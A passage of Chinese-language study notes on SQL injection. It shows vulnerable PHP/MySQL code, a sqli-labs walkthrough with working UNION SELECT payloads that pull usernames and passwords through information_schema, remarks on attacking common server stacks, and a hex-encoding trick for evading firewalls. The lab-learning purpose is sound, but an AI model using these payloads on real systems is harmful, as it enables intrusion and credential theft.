title="注入点"></a>注入点</h3><p>SQL注入其实就用户通过在表单中填写包含SQL关键字的数据来使数据库执行非常规代码的过程</p><p><strong>注入点寻找</strong>：<a href="https://www.cnblogs.com/lzlzzzzzz/p/11794713.html">https://www.cnblogs.com/lzlzzzzzz/p/11794713.html</a></p><h3 id="SQL语言"><a href="#SQL语言" class="headerlink" title="SQL语言"></a>SQL语言</h3><p>基础参考SQL菜鸟教程：<a href="https://www.runoob.com/sql/sql-tutorial.html">https://www.runoob.com/sql/sql-tutorial.html</a></p><ul><li>数据查询语言（DQL）</li><li>数据定义语言（DDL）</li><li>数据操纵语言（DML）</li><li>数据控制语言（DCL）</li></ul><p><a href="https://www.cnblogs.com/hanmk/p/11435699.html">https://www.cnblogs.com/hanmk/p/11435699.html</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Data Query Language, DQL</span></span><br><span class="line">SELECT [要提取的欄位，或是用<span class="string">&quot;*&quot;</span>代表全部的欄位]</span><br><span class="line">FROM [要提取的資料來源物件，包含資料表，檢視表與表格型使用者函數等] -- 可搭配JOIN做關聯式連結。</span><br><span class="line">WHERE [提取的過濾條件] -- WHERE可有可無。</span><br><span class="line">GROUP BY [要做彙總的群組欄位] -- GROUP BY在使用彙總指令時必須要有。</span><br><span class="line">HAVING [要做為條件的彙總欄位] -- 要使用彙總函數作為條件時使用</span><br><span class="line">ORDER BY [要排序的欄位與方向] -- ORDER BY可有可無，若沒有則是按照查詢引擎的輸出序為主。</span><br><span class="line"><span class="comment">//Data Definition Language, DDL</span></span><br><span class="line">CREATE可以用来创建用户、数据库，数据表，视图，存储过程，存储函数，触发器，索引等。</span><br><span class="line">ALTER是负责数据库对象修改的指令。</span><br><span class="line">DROP是删除数据库对象的指令，只需要指定要删除的数据库对象名即可。</span><br><span class="line"><span class="comment">//Data Manipulation Language, DML</span></span><br><span class="line">INSERT 是将数据插入到数据库对象中的指令，可以插入数据的数据库对象有数据表以及可更新查看表两种。</span><br><span class="line">UPDATE 指令是依给定条件，将匹配条件的数据表中的数据更新为新的数值。</span><br><span class="line">DELETE 是为数据库对象中删除数据的指令。</span><br><span class="line"><span class="comment">//Data Control Language</span></span><br><span class="line">DCL以控制用户的访问权限为主，</span><br><span class="line">GRANT为授权语句</span><br><span class="line">REVOKE是撤销授权语句</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="php-MySQL"><a href="#php-MySQL" class="headerlink" title="php+MySQL"></a>php+MySQL</h3><p><a href="https://www.runoob.com/php/php-mysql-intro.html">https://www.runoob.com/php/php-mysql-intro.html</a></p><blockquote><p>通过 PHP，可以连接和操作数据库。</p><p>MySQL 是跟 PHP 配套使用的最流行的开源数据库系统。</p></blockquote><p>以phpstudy为例，启动Apache和MySQL，安装一个可视化的数据库管理软件，phpmyadmin，url中直接进入，（现实中大多数数据库使用命令行操控）</p><p>在MySQL中新建一个名为haha的数据库，数据库中新建一个table1表，表项设置username，id，password这三个字段，数据项的属性设置一下</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210713171434950.png" alt="image-20210713171434950"></p><p>在www目录下的index.php中添加如下代码：(多练习)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="variable">$servername</span>=<span class="string">&quot;localhost&quot;</span>; <span class="comment">//定义一个服务器主机名，与win上的127.0.0.1类似</span></span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;root&quot;</span>;<span class="comment">//用来连接数据库用户名密码</span></span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"><span class="comment">//创建连接   mysqli自带对象，将连接对象存给变量conn</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;  <span class="comment">//如果链接对象中connect_error返回失败</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;连接失败:&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error); <span class="comment">//die函数断掉连接同时用.返回错误,php使用点来连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//增删改查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库的查询（读取数据库）</span></span><br><span class="line"><span class="comment">//参考https://www.runoob.com/php/php-mysql-select.html 代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//准备一条数据库语句（sql语句）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM table1 WHERE id &lt; 3&quot;</span>; <span class="comment">//将数据库中table1表中id项小于3的元素都选出来</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);<span class="comment">//执行建立的conn连接对象中query函数，将sql语句塞给数据库，将执行（query）结果返回给变量$result</span></span><br><span class="line"><span class="comment">//判断result有没有东西</span></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$result</span> -&gt;num_rows &gt; <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="comment">//输出数据</span></span><br><span class="line">     <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())<span class="comment">//用while循环一条条去读取</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;------&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;------&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>; <span class="comment">//这里返回的row类似于js对象数据，里面有每个条目的信息，包含了name，password等个体属性</span></span><br><span class="line">         <span class="comment">//这里输出是sql查询语句的子集关系，所以一般SQL选所有*</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;未查询到结果&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据库的增加数据（插入数据） </span></span><br><span class="line"><span class="comment">//参考 https://www.runoob.com/php/php-mysql-insert.html</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO table1 (id ,username,password) VALUE (8,&#x27;haha123&#x27;,&#x27;9999123&#x27;)&quot;</span>; <span class="comment">//注意有引号</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)<span class="comment">//执行语句query是否成功</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;插入成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据的修改（update）</span></span><br><span class="line"><span class="comment">//参考https://www.runoob.com/php/php-mysql-update.html</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE table1 SET password=&#x27;nibi123&#x27; WHERE username=&#x27;haha123&#x27; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR:&#x27;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数据的删除</span></span><br><span class="line"><span class="comment">//参考 https://www.runoob.com/php/php-mysql-delete.html</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM table1 WHERE username=&#x27;haha123&#x27; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>)===<span class="literal">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据删除成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Error:&#x27;</span>.<span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php-html"><a href="#php-html" class="headerlink" title="php+html"></a>php+html</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $servername &#x3D; &quot;localhost&quot;; &#x2F;&#x2F;大部分公司的代码与数据库不在一起，所以一般这里先写个远程连接的ip地址</span><br><span class="line">    $username&#x3D;&quot;root&quot;;</span><br><span class="line">    $password&#x3D;&quot;root&quot;;</span><br><span class="line">    $dbname&#x3D;&quot;haha&quot;;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;创建连接</span><br><span class="line">    $conn &#x3D; new mysqli($servername,$username,$password,$dbname);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;检测连接</span><br><span class="line">    if($conn-&gt;connect_error)&#123;</span><br><span class="line">        die(&quot;连接失败：&quot;.$conn-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;数据库查语句</span><br><span class="line">    $sql &#x3D; &quot;SELECT * FROM table1 WHERE id &lt; 12 &quot;;</span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;结合html表格输出数据</span><br><span class="line">        echo &quot;&lt;table border&#x3D;&#39;1&#39;&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;tr&gt; &lt;th&gt;id&lt;th&gt; &lt;th&gt;username&lt;th&gt; &lt;th&gt;password&lt;th&gt;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">        while($row&#x3D;$result-&gt;fetch_assoc())</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;&#x2F;td&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        echo &quot;&lt;&#x2F;table&gt;&quot;</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;未查询到数据&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();&#x2F;&#x2F;数据库需要关闭，否则有安全隐患</span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><hr><p>上面的php+mysql漏洞百出</p><p>漏洞为什么会出现？</p><blockquote><p>因为和用户有互动；</p><p>因为需要调用后端的逻辑代码，甚至是调用数据库卡或者操作系统命令</p></blockquote><p>什么互动？</p><blockquote><p>游戏充钱，登录注册，弹幕，查新闻查数据。比如斗鱼弹幕漏洞。简而言之，与客户有互动的地方就有可能有互动。</p></blockquote><blockquote><p>关于mysql部署与操作，见SQL-Mysql笔记篇</p></blockquote><hr><h2 id="SQLi基本流程"><a href="#SQLi基本流程" class="headerlink" title="SQLi基本流程"></a>SQLi基本流程</h2><p>环境：sqli-labs</p><p>第一关</p><p>根据前面学到的php对数据库操作的SQL语句，以及上面命令行控制数据库的语句</p><p><strong>估算目标的数据库语法</strong></p><p>select username,password from tablex where id=2 limit 0,1  这里估算是这样，但是id也有可能加了引号或者括号等符号</p><p><strong>黑客需要破坏数据库语句</strong></p><p>目的是为了知道闭合方式</p><p>一般写代码时会有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]; </span><br></pre></td></tr></table></figure><p>这个世界上所有的闭合方式</p><blockquote><p>` 反引号，机器生成的基本都是反引号，table username</p><p>’ ‘     “  ”   ( )   </p><p>（’ ‘）  （“   ”） </p><p>（（x）） （（’x‘）） （（“x”））</p><p>没有任何闭合方式的</p></blockquote><p><strong>1、确定闭合方式</strong></p><p>在url中输入 id=2’</p><p>‘ ’2‘ ’ LIMIT 0,1 ‘</p><p>去掉第一个与最后一个’ （这是报错自带的格式）</p><p>‘ 2 ’ ‘ LIMIT 0,1  其中2’是自己输入的id，因此剩下的就是单引号闭合，也就是说，通过传入错误参数2‘让数据库懵逼，然后报错near’  ’ 2‘ ‘LIMIT 0,1 ’</p><p>这个错把有错误的代码部分暴露了出来，发现代码中错误参数2‘周围使用单引号包裹，于是得知数据库这里的闭合方式是单引号；</p><p>另外，使用\转义符可以将\后面第一个符号变成字符，纳入到字符串中，因此当id=2\时，如果 \ 遇到字母比如\n，这里会把字符转义成换行</p><p>报错 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &#x27;</span><span class="number">2</span>\<span class="string">&#x27; LIMIT 1,2 ’</span></span><br></pre></td></tr></table></figure><p>也可以看出来是单引号闭合</p><p>知道是单引号闭合之后，可以估计语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> tablex <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27; 2&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>2、注释掉后面的limit，消除语法报错</strong></p><p>数据库注释符</p><p>–    /**/    #</p><p>+相当于空格</p><p>暴露单引号之后，这里就像填空题 id=’空‘ limit 0,1</p><p>对这里的空，写个2’ 单引号就把空给提前闭合，然后使用–+把后面limit限制注释掉，limit 0,1表示只显示从索引为0，显示1个数据的意思。将limit限制解除即可进行更多操作。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwoed <span class="keyword">from</span> tablex <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27; 2&#x27;</span><span class="comment">--+ &#x27; limit 0,1</span></span><br></pre></td></tr></table></figure><p>这里将id的壳子‘  ’后一个单引号用–+注释掉，<em>注释符–后面需要空格+才能生效</em>，注释后，该语句就等效于：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwoed <span class="keyword">from</span> tablex <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27; 2&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>3、用order by二分法确定有多少个栏目</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username，password <span class="keyword">from</span> tablex <span class="keyword">where</span> id<span class="operator">=</span>’<span class="number">2</span>‘ <span class="keyword">order</span> <span class="keyword">by</span> [数字] <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="string">&#x27; order by [数字] --+</span></span><br></pre></td></tr></table></figure><p>发现order by 3 正常，4不正常，说明数据库有3个栏目（这里的数字应该是下标的感觉）order用法是对字段进行排序，默认升序asc，降序desc，参考<a href="https://www.runoob.com/sql/sql-orderby.html">https://www.runoob.com/sql/sql-orderby.html</a> order by用法</p><p><em>注意，这里的id需要为正常数</em></p><p><strong>4、根据栏目数，用select联合查询数据表，打通数据库与页面显示对应栏目位置</strong></p><p>select id，username，password from tablex where id=’-2‘ union select 1,2,3 –+</p><p>-2的id为了显示错误，报错，前面显示失败了，后面才可以显示出来了，（这和cmd中的||有点像），union联合语句，在屏幕上显示报错位置，发现报错位是2,3</p><p><em>这里漏洞相当于union前面不执行就返回后面？-2报错导致不显示，select拼接数据借机显示，union为何方神圣？</em></p><p><strong>5、查看数据库的库名</strong></p><p>将报错位置替换为数据库语法</p><p>id=-2’ union select 1,database(), 3 –+</p><p>发现库名是security，（数据库结构，以mysql为例，数据库软件》若干个数据库》表》columns，其中information_schema相当于数据库软件的户口本数据库，schema的意思可以理解为库，如table_schema这个column表示table表所在的数据库名称，table_name才是表的名称</p><p>这里漏洞 就相当于database()可以返回数据库名称，<em>database（）是何方神圣？</em></p><p><strong>6、根据库名查找表名</strong></p><p>数据库都类似有一个<strong>information_schema</strong>的数据库，用于存放数据库相关信息。TABLES和COLUMNS表就相当于数据库的户口本，表<strong>tables</strong>中有列叫<strong>table_schema</strong>,对应列<strong>table_name</strong>， 记录数据库中的所有库名和表项。<strong>COLUMNS</strong>中还有<strong>COLUMN_NAME</strong>列名，存放了每个表中的内容项</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-2</span><span class="string">&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1 --+</span></span><br></pre></td></tr></table></figure><p>当前的页面数据来自security，而security这个数据库的户口本一般在information_schema下的tables表中表项为table_schema中，通过查询可以得到当前页面的security数据库中有哪些表。</p><p>通过修改上面limit中的0，来慢慢渗透，逐个查到表名有emails，referers，uagents，users，这里的limit 0,1 后面的1是对应于页面爆破的位置显示空位只有一个，所以貌似只能修改limit 1,1      2,1    3,1 这样修改0位的序号来逐一查看</p><p>黑客觉得users里面的数据很有价值，于是</p><p><strong>7、查询表中的表项</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-2</span><span class="string">&#x27; union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name = &#x27;</span>users<span class="string">&#x27; limit 0,1 --+</span></span><br></pre></td></tr></table></figure><p>发现users里有id，username和password的值</p><p>这里需要靠经验，知道数据库中有information的结构，知道在information_schema的columns表中也有table_schema字段，但是比tables的表还多了columns_name这个字段，这个需要提前确定用的数据库是哪种，数据库里面结构大概是什么样，有没有户口本，户口本怎么查的问题，涉及到逆向了。</p><p><strong>8、拿到所有的username和password的值</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-2</span><span class="string">&#x27;  union select 1, username, password, from users limit 0,1 --+  (limit 1,1   2,1)</span></span><br></pre></td></tr></table></figure><p>上面7个步骤都是为了这步，前面的步骤都是为了知道当前所在的数据库中有什么表，表中有什么想要的数据，知道了之后直接用select 列 from 表的SQL语法实现。</p><p>也可以使用group_concat（）函数一次性全部得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-2</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users --+</span></span><br></pre></td></tr></table></figure><hr><ul><li><p>之后可以结合SQL其他语句对数据库进行一些操作，一个合格的hacker尽量不会去动数据库，可以查，删除什么的有明显日志，可能还会触发跟踪</p></li><li><p>在html页面中结合css，js，再嵌套php进行get和post，可以做一个可以登录的界面</p></li><li><p>做下sqli-lab前四题，手工注入，一晚上学完runoob数据库及以上的东西。php占据网页的90%市场。java的jsp死了，微软的asp也没成功（现在有些比较有钱人在用asp这种古老的网站），python网页很拉胯，php高级部分大公司很实用，很多公司使用json传输数据。</p></li><li><p>练习到什么程度？不用看笔记，熟练做出来。</p></li></ul><h2 id="常见的网站架构"><a href="#常见的网站架构" class="headerlink" title="常见的网站架构"></a>常见的网站架构</h2><ul><li>wiindows+iis（网站服务器）+asp/aspx(asp.net)（试图代替php）+access（已经淘汰的数据库）/mssql（抄袭mysql）</li></ul><blockquote><ol><li><p>这种网站比较老，会出现一些经典漏洞，比如编辑器的漏洞，谷歌百度找。（后面实战做iis编辑器漏洞）</p></li><li><p>也有企业的OA系统，管理系统，进销存的系统，因为比较容易和企业内网结合，企业里面用到AD和exchange服务，win+wiin组合比较好，所以一般企业用此系统概率较大，win服务器自带可以装iis</p></li><li><p>一般这里windows打下来是普通用户，之后需要利用本地，提权漏洞进行提权，github上自己找</p></li></ol></blockquote><ul><li>windows+apache+php+mysql=wamp(一般使用软件一次搭建)（所谓的万能组合）</li></ul><blockquote><ol><li><p>多数情况下用这个组合大多数是菜鸟，因为可以百度直接搜到wamp一键安装；一般使用软件进行集成化搭建，这种一般出问题不会去修复漏洞</p></li><li><p>mysql这里一般都带phpadmin，可以搜phpadmin老版本的 0day / 漏洞,包括mysql本身也有漏洞</p></li></ol></blockquote><ul><li>linux+apache/nginx/tengine(基于Nginx的魔改)+php+mysql=lamp/lnmp</li></ul><blockquote><ol><li><p>有可能使用宝塔或其他面板搭建，意味着里面一键安装有些漏洞是不会修复的，包括面板本身也有可能有漏洞，</p></li><li><p>phpstudy面板是基于docker实现，宝塔面板基于python实现（用python做一个面板的网站，再用这个网站搭建lamp这种</p></li><li><p>不排除技术高的人会自己挑选版本进行搭建，自定义组合的安全性能比较高</p></li><li><p>如果ping这个apache不是CDN而是本尊的话，说明这哥们安全意识不太强，因为apache负载均衡好像也就几千个人，ddos攻击直接挂了，apache不经打</p></li><li><p>nginx比较经打，可以hold4万多人这样，此时需要借助其他攻击机</p></li><li><p>之前宝塔面板爆出过phpadmin的一个漏洞，一般像这种集成化的mysql都会有phpadmin，会成为突破口</p></li><li><p>一般这里打下来也不是root权限，而是网站管理账号的权限，www的一个用户</p></li></ol></blockquote><ul><li>linux+tomcat+java(jsp)+pracle/mysql  (一般用来金融系统比较多，java后台越来越少了)</li></ul><blockquote><ol><li>这种打下来就是root权限，但是易守难攻，所以也越来越少</li></ol></blockquote><ul><li>linux+nginx+python（django/flask）+mysql  用python做后台比较少，比较新</li></ul><blockquote><ol><li>相对比较新，不容易被针对</li><li>python打下来可能也不是root权限</li></ol></blockquote><h2 id="SQLi工具原理分析"><a href="#SQLi工具原理分析" class="headerlink" title="SQLi工具原理分析"></a>SQLi工具原理分析</h2><h3 id="pangolin（穿山甲）分析"><a href="#pangolin（穿山甲）分析" class="headerlink" title="pangolin（穿山甲）分析"></a>pangolin（穿山甲）分析</h3><h4 id="软件原理"><a href="#软件原理" class="headerlink" title="软件原理"></a>软件原理</h4><p>这个软件从安装目录文件看出，是通过穷举table，库等的名字来解决的，强大程度与txt文件中字典数量有关</p><h4 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h4><p>目标地址得是觉得有注入点的地址，不能指望这个软件自己找，注意这里的id=1，得是普通的正整数，否则会显示错误乱码</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>select * from tablex where id = 1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果是数字类型</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span></span><br><span class="line">如果是字符类型</span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line">如果是搜索类型</span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;%1%&#x27;</span></span><br><span class="line">可能情况，后面高级<span class="keyword">sql</span>会介绍搜索注入</span><br></pre></td></tr></table></figure><h4 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h4><p>一般根据上面常用组合来估计DB</p><h4 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h4><p>一般magic_quotes_gpc最好是off，否则单引号注入这种方法可能会失效</p><p>当打到less5就已经不靠谱了（但是自己测试还可以搞诶），这么流行的软件其实能力有限</p><h3 id="havij（萝卜头）分析"><a href="#havij（萝卜头）分析" class="headerlink" title="havij（萝卜头）分析"></a>havij（萝卜头）分析</h3><p>使用前双击注册，这样可以把空键注册掉，否则用不了</p><p>和穿山甲类似，给目标，数据库类型用自动探测（本质上也是穷举），给个type</p><h4 id="hex技巧"><a href="#hex技巧" class="headerlink" title="hex技巧"></a>hex技巧</h4><p>当试图获取table_name时，也是试图从information_schema中搜索名为security的表项的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Count</span>(table_name) <span class="keyword">of</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span> <span class="keyword">is</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>可以看到，这些软件本质上也是用的SQL语句与数据库进行交互。</p><p>这里的security转为16进制（hex值），一般防火墙检测字符看到16进制不会管，反过来思考如果每个十六进制甚至二进制的值都要转为字符，那处理量将很大，可能违背防火墙原则。（那如果将固定十六进制纳入数据库进行搜索呢？可以拆分加密自解密？）</p><p>这两款软件有象征意义，对渗透工作没什么意义，但需要懂原理和用法。</p><h4 id="less-5"><a href="#less-5" class="headerlink" 